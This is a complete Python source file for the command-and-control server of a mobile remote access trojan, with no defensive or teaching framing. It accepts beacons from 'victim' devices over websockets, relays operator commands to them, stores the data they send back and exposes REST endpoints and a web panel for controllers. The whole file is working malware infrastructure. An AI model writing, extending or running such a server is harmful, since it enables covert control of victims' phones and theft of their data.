"""
Mobile RAT C2 Server — Python
websockets + aiohttp
"""

import asyncio
import json
import uuid
import logging
from datetime import datetime
from pathlib import Path

import aiohttp
from aiohttp import web
import aiohttp.web_ws as aio_ws

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')
log = logging.getLogger(__name__)

# ── State ────────────────────────────────────────────────────────────────────
devices     = {}   # device_id -> { ws, info, data, connected_at }
controllers = set()  # set of controller WebSocket responses

# ── Broadcast to all controllers ─────────────────────────────────────────────
async def broadcast(obj):
    msg = json.dumps(obj)
    dead = set()
    for ws in controllers:
        try:
            await ws.send_str(msg)
        except Exception:
            dead.add(ws)
    controllers.difference_update(dead)

# ── WebSocket handler ─────────────────────────────────────────────────────────
async def ws_handler(request):
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)

    path = request.path

    # ── Controller ───────────────────────────────────────────────────────────
    if '/controller' in path:
        controllers.add(ws)
        log.info(f"[CTRL] Controller connected. Total: {len(controllers)}")

        # Send snapshot of current devices
        snap = [
            {"id": did, "info": d["info"], "connected_at": d["connected_at"]}
            for did, d in devices.items()
        ]
        await ws.send_str(json.dumps({"type": "snapshot", "devices": snap}))

        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    if data.get("type") == "command":
                        target = devices.get(data.get("device_id"))
                        if target and not target["ws"].closed:
                            await target["ws"].send_str(json.dumps({
                                "type":    "command",
                                "command": data.get("command"),
                                "params":  data.get("params", {})
                            }))
                except Exception as e:
                    log.error(f"[CTRL] parse error: {e}")
            elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
                break

        controllers.discard(ws)
        log.info("[CTRL] Controller disconnected.")

    # ── Victim ───────────────────────────────────────────────────────────────
    else:
        device_id = None
        log.info(f"[VIC] New connection from {request.remote}")

        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)

                    if data.get("type") == "beacon":
                        device_id = data.get("device_id") or str(uuid.uuid4())
                        devices[device_id] = {
                            "ws":           ws,
                            "info":         data.get("info", {}),
                            "data":         {},
                            "connected_at": datetime.utcnow().isoformat()
                        }
                        log.info(f"[VIC] Beacon: {device_id} — {data.get('info', {}).get('model','?')}")
                        await broadcast({
                            "type": "device_online",
                            "id":   device_id,
                            "info": data.get("info", {})
                        })

                    elif data.get("type") in ("response", "error"):
                        if device_id and device_id in devices:
                            key = data.get("command", "unknown")
                            devices[device_id]["data"][key] = data.get("data") or data.get("error")
                        await broadcast({**data, "device_id": device_id})

                except Exception as e:
                    log.error(f"[VIC] parse error: {e}")

            elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
                break

        if device_id and device_id in devices:
            del devices[device_id]
            await broadcast({"type": "device_offline", "id": device_id})
            log.info(f"[VIC] Device disconnected: {device_id}")

    return ws

# ── REST API ──────────────────────────────────────────────────────────────────
async def api_devices(request):
    result = [
        {"id": did, "info": d["info"], "connected_at": d["connected_at"]}
        for did, d in devices.items()
    ]
    return web.json_response(result)

async def api_command(request):
    body = await request.json()
    device_id = body.get("device_id")
    command   = body.get("command")
    params    = body.get("params", {})

    device = devices.get(device_id)
    if not device:
        return web.json_response({"error": "device_not_found"}, status=404)

    await device["ws"].send_str(json.dumps({
        "type": "command", "command": command, "params": params
    }))
    return web.json_response({"status": "sent", "command": command})

async def api_data(request):
    device_id = request.match_info["device_id"]
    command   = request.match_info["command"]
    device    = devices.get(device_id)
    if not device:
        return web.json_response({"error": "device_not_found"}, status=404)
    return web.json_response({"data": device["data"].get(command)})

# ── App factory ───────────────────────────────────────────────────────────────
def make_app():
    app = web.Application()
    app.router.add_get("/ws",           ws_handler)
    app.router.add_get("/ws/victim",    ws_handler)
    app.router.add_get("/ws/controller",ws_handler)
    app.router.add_get("/api/devices",  api_devices)
    app.router.add_post("/api/command", api_command)
    app.router.add_get("/api/data/{device_id}/{command}", api_data)

    # Serve static web panel
    static_path = Path(__file__).parent / "public"
    if static_path.exists():
        app.router.add_static("/", static_path, show_index=True)

    return app

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8080))
    app  = make_app()
    log.info(f"C2 Server starting on 0.0.0.0:{port}")
    log.info(f"Web Panel: http://localhost:{port}")
    web.run_app(app, host="0.0.0.0", port=port)
